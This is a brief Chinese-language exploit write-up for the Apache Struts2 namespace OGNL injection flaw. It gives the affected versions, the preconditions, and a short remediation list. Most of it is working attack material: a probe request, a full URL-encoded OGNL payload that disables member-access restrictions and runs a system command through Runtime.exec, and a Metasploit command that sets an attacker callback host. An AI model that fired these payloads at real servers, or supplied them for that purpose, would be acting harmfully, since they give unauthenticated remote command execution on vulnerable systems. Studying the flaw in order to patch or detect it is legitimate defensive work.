## 漏洞描述

当 Struts2 的配置满足以下条件时：alwaysSelectFullNamespace 值为 true，action 元素未设置 namespace 属性，或使用了通配符，namespace 将由用户从 uri 传入，并作为 OGNL 表达式计算，最终造成任意命令执行漏洞。

## 影响版本

- Apache Struts <= 2.3.34
- Apache Struts <= 2.5.16

## 前置条件

- 无需认证
- 目标应用 alwaysSelectFullNamespace=true 且 action 未设置 namespace

## 利用步骤

1. 在 URL 中注入 OGNL 表达式
2. 触发 namespace 解析

## Payload

```http
GET /struts2-showcase/$%7B233*233%7D/actionChain1.action HTTP/1.1
Host: target:8080
```

```http
GET /$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('id')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action HTTP/1.1
Host: target:8080
```



Metasploit 利用:
```bash
msfconsole -q -x "use exploit/multi/http/struts2_namespace_ognl; set RHOSTS target; set TARGETURI /struts2-showcase/; set RPORT 8080; set ACTION actionChain1; set LHOST attacker_ip; run"
```

## 修复建议

1. 升级 Apache Struts 至 2.3.35 或 2.5.17+
2. 修复配置避免 alwaysSelectFullNamespace=true
3. 为 action 元素设置明确的 namespace
